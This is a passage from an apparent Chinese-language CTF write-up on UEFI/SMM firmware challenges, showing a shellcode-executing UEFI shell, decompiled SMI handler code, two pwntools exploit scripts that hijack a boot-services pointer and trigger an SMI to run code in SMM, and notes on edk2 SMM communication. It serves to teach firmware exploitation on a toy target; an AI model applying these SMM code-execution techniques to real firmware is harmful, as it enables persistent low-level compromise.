PciRoot(0x0)/Pci(0x1F,0x2)/Sata(0x0,0xFFFF,0x0)/HD(1,MBR,0xBE1AFDFA,0x3F,0xFBFC1)</span><br><span class="line">     BLK0: Alias(s):</span><br><span class="line">          PciRoot(0x0)/Pci(0x1F,0x2)/Sata(0x0,0xFFFF,0x0)</span><br><span class="line">     BLK2: Alias(s):</span><br><span class="line">          PciRoot(0x0)/Pci(0x1F,0x2)/Sata(0x2,0xFFFF,0x0)</span><br><span class="line">Shell&gt; fs0:</span><br><span class="line">FS0:\&gt; mem</span><br><span class="line">Memory Address 00000000069EE018 78 Bytes</span><br><span class="line">  069EE018: 49 42 49 20 53 59 53 54-46 00 02 00 78 00 00 00  *IBI SYSTF...x...*</span><br><span class="line">  069EE028: F8 83 E2 1D 00 00 00 00-18 D1 9B 06 00 00 00 00  *................*</span><br><span class="line">  069EE038: 00 00 01 00 00 00 00 00-98 DF F6 05 00 00 00 00  *................*</span><br><span class="line">  069EE048: F0 22 F6 05 00 00 00 00-18 68 20 06 00 00 00 00  *.<span class="string">&quot;.......h .....*</span></span><br><span class="line"><span class="string">  069EE058: 20 D1 79 05 00 00 00 00-18 C9 F6 05 00 00 00 00  * .y.............*</span></span><br><span class="line"><span class="string">  069EE068: 90 21 F6 05 00 00 00 00-98 EB 9E 06 00 00 00 00  *.!..............*</span></span><br><span class="line"><span class="string">  069EE078: 80 6B FD 06 00 00 00 00-0A 00 00 00 00 00 00 00  *.k..............*</span></span><br><span class="line"><span class="string">  069EE088: 98 EC 9E 06 00 00 00 00-                         *........*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Valid EFI Header at Address 00000000069EE018</span></span><br><span class="line"><span class="string">---------------------------------------------</span></span><br><span class="line"><span class="string">System: Table Structure size 00000078 revision 00020046</span></span><br><span class="line"><span class="string">ConIn (0000000005F622F0) ConOut (000000000579D120) StdErr (0000000005F62190)</span></span><br><span class="line"><span class="string">Runtime Services 00000000069EEB98</span></span><br><span class="line"><span class="string">Boot Services    0000000006FD6B80</span></span><br><span class="line"><span class="string">SAL System Table 0000000000000000</span></span><br><span class="line"><span class="string">ACPI Table       0000000006B7E000</span></span><br><span class="line"><span class="string">ACPI 2.0 Table   0000000006B7E014</span></span><br><span class="line"><span class="string">MPS Table        0000000000000000</span></span><br><span class="line"><span class="string">SMBIOS Table     00000000069D7000</span></span><br><span class="line"><span class="string">FS0:\&gt; ToyApp</span></span><br><span class="line"><span class="string">$$$$$$$$$$$$$$$$$$$$$$$$$</span></span><br><span class="line"><span class="string">$$                     $$</span></span><br><span class="line"><span class="string">$$  UEFI BackDoor :)   $$</span></span><br><span class="line"><span class="string">$$  Ring 0 priviledge  $$</span></span><br><span class="line"><span class="string">$$                     $$</span></span><br><span class="line"><span class="string">$$$$$$$$$$$$$$$$$$$$$$$$$</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Type some shellcode with &#x27;DONE&#x27; on a seperate line and press enter to execute.</span></span><br><span class="line"><span class="string">Type &#x27;QUIT&#x27; to quit the program.</span></span><br><span class="line"><span class="string">Your shellcode:</span></span><br></pre></td></tr></table></figure><p>熟悉的uefishell任意执行shellcode</p><h3 id="TOYSMM"><a href="#TOYSMM" class="headerlink" title="TOYSMM"></a>TOYSMM</h3><p>使用uefitools处理OVMF_CODE.fd</p><p>工具打开固件包后,搜索题目的名字关键字<code>Toy</code></p><p>将找到的SMM驱动模块dump下来并ida打开</p><p>直奔<code>ChildSwSmiHandler</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS __fastcall <span class="title function_">ChildSwSmiHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">        EFI_HANDLE DispatchHandle,</span></span><br><span class="line"><span class="params">        <span class="type">const</span> <span class="type">void</span> *Context,</span></span><br><span class="line"><span class="params">        _BYTE *CommBuffer,</span></span><br><span class="line"><span class="params">        UINTN *CommBufferSize)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+0h] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">32</span>]; <span class="comment">// [rsp+4h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !CommBuffer || !CommBufferSize )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x8000000000000002</span>ui64;</span><br><span class="line">  v5 = <span class="number">0x41414141</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !sub_2340(CommBuffer + <span class="number">16</span>, &amp;v5, <span class="number">3</span>i64) )</span><br><span class="line">    gBS-&gt;LocateProtocol(&amp;EFI_ACPI_TABLE_PROTOCOL_GUID, <span class="number">0</span>i64, (<span class="type">void</span> **)v6);</span><br><span class="line">  <span class="keyword">if</span> ( &amp;v5 != (<span class="type">int</span> *)<span class="number">0x23330000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !sub_2340((_BYTE *)<span class="number">0x23330000</span>, &amp;v5, <span class="number">3</span>i64) )</span><br><span class="line">      sub_1000();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sub_2340</code>函数用于匹配内存是否相等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_2340</span><span class="params">(_BYTE *a1, _BYTE *a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">bool</span> v6; <span class="comment">// zf</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v6 = *a1++ == *a2++;</span><br><span class="line">    --a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 );</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)*(a1 - <span class="number">1</span>) - (<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)*(a2 - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>sub_1000()</code>就直接getflag了</p><p>但是无论如何第二个条件是一定不会满足的</p><p>即</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !sub_2340((_BYTE *)<span class="number">0x23330000</span>, &amp;v5, 3i64) )</span><br><span class="line">      sub_1000();</span><br></pre></td></tr></table></figure><p>是永远不可能满足的</p><p>不过我们可以看到无论如何都是会执行</p><p><code>gBS-&gt;LocateProtocol(&amp;EFI_ACPI_TABLE_PROTOCOL_GUID, 0i64, (void **)v6);</code>的</p><p><strong>而且在DXE态下,我们是具有修改bootservice的权限的</strong>,那岂不是可以直接修改LocateProtocol函数指针为<code>sub_1000()</code>,然后发送SMI即可在<strong>SMM状态</strong>下任意地址执行</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Boot Services    &#x27;</span>)</span><br><span class="line">boot_service = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;BootService @ 0x%x&#x27;</span>, boot_service)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">AllocatePool = <span class="number">0x6fd12f1</span></span><br><span class="line">LocateProtocol = <span class="number">0x6fcc7b4</span></span><br><span class="line">mSmmCommunication = <span class="number">0x6ad9310</span></span><br><span class="line">Communicate = <span class="number">0x6ad6abf</span></span><br><span class="line">Guid = <span class="number">0x9D76F4B1548E0872EC86B7F3B31CF11E</span></span><br><span class="line"></span><br><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">buffer = <span class="built_in">int</span>(p.recvn(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;Allocated buffer @ 0x%x&#x27;</span>, buffer)</span><br><span class="line"><span class="comment">#//backdoor 0x7F06000</span></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov qword ptr [<span class="subst">&#123;boot_service + <span class="number">320</span>&#125;</span>], 0x7F06000</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, 0x38</span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov r8, <span class="subst">&#123;buffer+<span class="number">0x30</span>&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    mov r12, 0x23330000</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;Guid&#125;</span>  /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad 0x18                              /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    .quad 0                                 /* Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">    .quad 0</span></span><br><span class="line"><span class="string">    .quad 0x41414141</span></span><br><span class="line"><span class="string">    .quad 0x30</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(code.<span class="built_in">hex</span>().encode())</span><br><span class="line">p.sendline(<span class="string">b&#x27;done&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>或者直接修改全局变量并使用out触发smi</p><p><del>不过还不是很清楚是怎么定位这些全局变量的(<strong>特别是smm_buffer</strong>),反编译去找?,不太懂,所以还是更喜欢第一种方法</del>(已解决)</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./run.sh&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a, b)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">smm_buffer = <span class="number">0x6ad9380</span></span><br><span class="line">guid = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;1EF11CB3F3B786EC72088E54B1F4769D&#x27;</span>)</span><br><span class="line">CommBuffer_offset = <span class="number">56</span></span><br><span class="line">BufferSize_offset = CommBuffer_offset + <span class="number">8</span></span><br><span class="line">ReturnStatus_offset = BufferSize_offset + <span class="number">8</span></span><br><span class="line">bootservice = <span class="number">0x6FD6B80</span></span><br><span class="line">backdoor = <span class="number">0x7F06000</span></span><br><span class="line">payload = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">              </span></span><br><span class="line"><span class="string">mov rcx, 0x6FD6B80/* gBS-&gt;LocateProtocol = PrintFlag */</span></span><br><span class="line"><span class="string">add rcx, 0x140</span></span><br><span class="line"><span class="string">mov rdx, 0x7F06000</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rcx, 0x6ad9400/* CommBuffer-&gt;HeaderGuid = ToySmmGuid */</span></span><br><span class="line"><span class="string">mov rdx, 0xEC86B7F3B31CF11E</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 8</span></span><br><span class="line"><span class="string">mov rdx, 0x9D76F4B1548E0872</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 8/* CommBuffer-&gt;MessageLength = 4 */</span></span><br><span class="line"><span class="string">mov rdx, 0x4</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 24/* CommBuffer-&gt;Data[24] = &#x27;AAAA&#x27; */</span></span><br><span class="line"><span class="string">mov rdx, 0x41414141</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rcx, 0x6ad93b8/* mSmmCorePrivateData-&gt;CommunicationBuffer = CommBuffer */</span></span><br><span class="line"><span class="string">mov rdx, 0x6ad9400</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string">add rcx, 8/* mSmmCorePrivateData-&gt;BufferSize = 0x1c */</span></span><br><span class="line"><span class="string">mov rdx, 0x1c</span></span><br><span class="line"><span class="string">mov [rcx], rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor eax, eax/* SMI */</span></span><br><span class="line"><span class="string">mov dx, 0xb2</span></span><br><span class="line"><span class="string">mov al, 0x00</span></span><br><span class="line"><span class="string">outb dx, al</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;Your shellcode:&#x27;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">sl(payload.<span class="built_in">hex</span>())</span><br><span class="line">sl(<span class="string">&quot;DONE&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="拾遗"><a href="#拾遗" class="headerlink" title="拾遗"></a>拾遗</h1><h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>我们任意反汇编一个UEFI程序都可以看到其调用约定是<a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">Microsoft x64</a>，因此参数在RCX、RDX、R8、R9中，然后堆栈。</p><h2 id="uefishell"><a href="#uefishell" class="headerlink" title="uefishell"></a>uefishell</h2><p>大多数的uefi类题目,最终提供给我们的交互接口都是一个<a href="https://github.com/pbatard/UEFI-Shell">uefishell</a>,其允许我们直接输入机器码的十六进制表示,然后去以<code>ring 0</code>的身份去执行</p><p>然后出题人自己打上一些patch</p><p>最后我们能够直接看到的efi程序,一般就是这个</p><p>然后其一般还会能够与一个SMM驱动程序交互</p><p>当然其实也不一定,也有菜单类的uefi题目</p><h2 id="GUID"><a href="#GUID" class="headerlink" title="GUID"></a>GUID</h2><p>UEFI中每一个protocol与服务都会有一个GUID(全局唯一标识符Globally Unique Identifier)</p><p>很多交互接口都需要用到guid去寻找对应的protocol</p><p>在ida中很容易找到对应的guid</p><p>对于一些全局变量来说<strong>,其guid是始终固定的</strong></p><p>常见的如下(基于edk2)</p><div class="table-container"><table><thead><tr><th>name</th><th>guid</th></tr></thead><tbody><tr><td>gEfiSmmCommunicationProtocolGuid</td><td>0x32c3c5ac65db949d4cbd9dc6c68ed8e2</td></tr><tr><td></td><td></td></tr><tr><td></td></tr></tbody></table></div><h2 id="与SMM通信"><a href="#与SMM通信" class="headerlink" title="与SMM通信"></a>与SMM通信</h2><p>一般uefi题目都会有两个关键的文件,分别是</p><ol><li>前面提到的UEFIshell驱动处理程序,其是一个普通的uefi驱动程序,处于ring 0</li><li>以及一个运行在SMM状态下的模块(可能需要从OVMF.fd中提取)</li></ol><p>我们真正需要关心的其实就是两者之间的交互</p><p>对于后者,其在执行时一般都会有运行类似这样一段代码注册一个要执行的处理程序(SMI handler)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Status = gSmst-&gt;SmiHandlerRegister (</span><br><span class="line">                  SmmCowsayHandler,</span><br><span class="line">                  &amp;gEfiSmmCowsayCommunicationGuid,</span><br><span class="line">                  &amp;DispatchHandle</span><br><span class="line">                  );</span><br></pre></td></tr></table></figure><p>当 SMI 发生时，EDK2 注册的 SMI 处理程序会遍历已注册处理程序的链接列表，并选择合适的处理程序来运行。</p><p><strong>第二个参数就是指向这个handler的guid的指针</strong>,经常能用上</p><p><code>SmiHandlerRegister</code>声明如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmiHandlerRegister</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN  EFI_SMM_HANDLER_ENTRY_POINT2  Handler,</span></span><br><span class="line"><span class="params">  IN  CONST EFI_GUID                *HandlerType  OPTIONAL,</span></span><br><span class="line"><span class="params">  OUT EFI_HANDLE                    *DispatchHandle</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  SMI_HANDLER  *SmiHandler;</span><br><span class="line">  SMI_ENTRY    *SmiEntry;</span><br><span class="line">  LIST_ENTRY   *List;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((Handler == <span class="literal">NULL</span>) || (DispatchHandle == <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> EFI_INVALID_PARAMETER;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SmiHandler = AllocateZeroPool (<span class="keyword">sizeof</span> (SMI_HANDLER));</span><br><span class="line">  <span class="keyword">if</span> (SmiHandler == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> EFI_OUT_OF_RESOURCES;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SmiHandler-&gt;Signature  = SMI_HANDLER_SIGNATURE;</span><br><span class="line">  SmiHandler-&gt;Handler    = Handler;</span><br><span class="line">  SmiHandler-&gt;CallerAddr = (UINTN)RETURN_ADDRESS (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (HandlerType == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// This is root SMI handler</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    SmiEntry = &amp;mRootSmiEntry;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// None root SMI handler</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    SmiEntry = SmmCoreFindSmiEntry ((EFI_GUID *)HandlerType, TRUE);</span><br><span class="line">    <span class="keyword">if</span> (SmiEntry == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> EFI_OUT_OF_RESOURCES;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  List = &amp;SmiEntry-&gt;SmiHandlers;</span><br><span class="line"></span><br><span class="line">  SmiHandler-&gt;SmiEntry = SmiEntry;</span><br><span class="line">  InsertTailList (List, &amp;SmiHandler-&gt;Link);</span><br><span class="line"></span><br><span class="line">  *DispatchHandle = (EFI_HANDLE)SmiHandler;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>对于前者其一般使用<code>EFI_SMM_COMMUNICATION_PROTOCOL</code>协议提供的<code>Communicate()</code>方法与一个smm交流</p><p>在递归套娃后<code>EFI_SMM_COMMUNICATION_PROTOCOL</code>其实就是下面这个结构体,其只有一个成员<code>Communicate</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">EFI_MM_COMMUNICATION_PROTOCOL</span> &#123;</span></span><br><span class="line">  EFI_MM_COMMUNICATE    Communicate;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>EFI_MM_COMMUNICATE</code>的定义没找着,但根据一些线索,我们能够知道他是一个函数指针</p><p>常见的其被初始化为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">**/</span><br><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title 